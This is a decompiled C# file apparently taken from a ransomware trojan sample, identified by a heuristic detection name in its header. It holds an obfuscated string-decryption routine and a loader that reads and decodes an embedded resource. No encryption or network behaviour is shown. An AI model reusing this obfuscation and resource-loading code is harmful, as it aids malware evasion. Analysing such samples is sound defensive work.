// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Program, Version=1.0.0.0, Culture=neutral, PublicKeyToken=fad59cbbeaedaaa1
// MVID: 2B038658-8CEB-4874-AE4E-D5E8C7A3049F
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan-Ransom.MSIL.Gen.gen-274011aaa97fd19ad6d993a5555c9306090da6a9b16c991739033ebb7673a244.exe

using \u0003;
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace \u0003
{
  internal sealed class \u0002
  {
    private static readonly string \u0001;
    private static readonly string \u0002;
    internal static readonly byte[] \u0001;
    internal static readonly Dictionary<int, string> \u0001;
    internal static readonly object \u0001;
    internal static readonly bool \u0001;
    private static readonly int \u0001;

    public static string \u0001([In] int obj0)
    {
      int num1 = obj0;
      if (true)
      {
        int num2 = 107396847;
        do
        {
          if (num2 != 0)
          {
            obj0 = num1 ^ num2;
            int num3 = obj0;
            num2 = \u0002.\u0001;
            num1 = num3;
          }
        }
        while (false);
        obj0 = num1 - num2;
        num1 = \u0002.\u0001 ? 1 : 0;
      }
      return num1 == 0 ? \u0001.\u0003.\u0001(obj0) : \u0001.\u0003.\u0001(obj0);
    }

    static \u0002()
    {
label_0:
      if (true)
      {
        \u0002.\u0001 = "1";
        \u0002.\u0002 = "7";
        \u0002.\u0001 = (byte[]) null;
      }
      \u0002.\u0001 = new object();
      \u0002.\u0001 = false;
      \u0002.\u0001 = 0;
      do
      {
        if (true)
        {
          if (\u0002.\u0001 == "1")
          {
            \u0002.\u0001 = true;
            \u0002.\u0001 = new Dictionary<int, string>();
          }
          \u0002.\u0001 = Convert.ToInt32(\u0002.\u0002);
        }
        else
          goto label_0;
      }
      while (false);
      using (Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("{4934b6a4-3623-4aa0-8cd8-2862216c1af6}"))
      {
        if (true)
          goto label_10;
label_8:
        int int32;
        byte[] buffer;
        manifestResourceStream.Read(buffer, 0, int32);
        \u0002.\u0001 = \u0001.\u0003.\u0001(buffer);
label_9:
        return;
label_10:
        int32 = Convert.ToInt32(manifestResourceStream.Length);
        if (true)
        {
          buffer = new byte[int32];
          goto label_8;
        }
        else
          goto label_9;
      }
    }
  }
}
